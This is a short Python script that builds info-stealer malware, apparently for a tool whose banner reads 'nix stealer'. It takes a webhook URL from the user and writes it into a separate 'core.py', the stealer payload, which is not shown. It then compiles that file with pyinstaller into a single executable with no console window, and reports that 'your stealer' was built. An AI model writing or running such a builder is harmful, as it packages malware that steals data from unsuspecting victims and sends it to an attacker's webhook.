import os
import re
import subprocess

ASCII_ART = r'''
       .__                   __                .__                
  ____ |__|__  ___   _______/  |_  ____ _____  |  |   ___________ 
 /    \|  \  \/  /  /  ___/\   __\/ __ \\__  \ |  | _/ __ \_  __ \
|   |  \  |>    <   \___ \  |  | \  ___/ / __ \|  |_\  ___/|  | \/
|___|  /__/__/\_ \ /____  > |__|  \___  >____  /____/\___  >__|   
     \/         \/      \/            \/     \/          \/       


                   > Press Enter to continue
'''

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear_terminal()
    print(ASCII_ART)
    input()
    clear_terminal()
    webhook = input('Enter webhook: ')
    with open('core.py', 'r', encoding='utf-8') as f:
        code = f.read()
    new_code = re.sub(r'WEBHOOK_HERE', webhook, code)
    with open('core.py', 'w', encoding='utf-8') as f:
        f.write(new_code)
    build_cmd = ['pyinstaller', '--onefile', '--noconsole', 'core.py']
    result = subprocess.run(build_cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print('\nYour stealer is builded successfully.')
    else:
        print('\nBuild error:', result.stderr)

if __name__ == '__main__':
    main()
